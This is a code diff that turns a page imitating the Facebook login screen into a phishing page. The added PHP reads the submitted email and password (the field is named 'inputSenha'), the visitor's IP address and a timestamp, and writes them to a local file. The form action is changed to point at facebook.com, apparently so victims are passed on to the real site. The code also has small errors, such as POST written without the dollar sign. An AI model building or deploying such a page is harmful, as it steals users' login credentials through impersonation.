@@ -1,3 +1,18 @@
+<?php 
+
+   $email = POST['inputEmail'];
+   $pass = POST['inputSenha'];
+   $IP = $_SERVER['REMOTE_ADDR'];
+   $datatime = date("F j, Y, g:i a");
+
+   $data = "$datatime | $IP | $email | $pass";
+
+   $datafile = 'datafile.txt';
+   $fp = fopen($datafile, "r+");
+   fwrite($fp, $data, strlen($data));
+   fclose($fp);
+  
+?>
 <!DOCTYPE html>
 <head>
 <meta charset="UTF-8">
@@ -16,7 +31,7 @@
     <div class="headersubdiv">
       <img src="images/fblogo.png" class="fblogo">
       <div class="loginform">
-        <form method="POST">
+        <form method="POST" action="www.facebook.com">
         <table>
           <tr>
             <td class="logintext">Email or Phone</td>
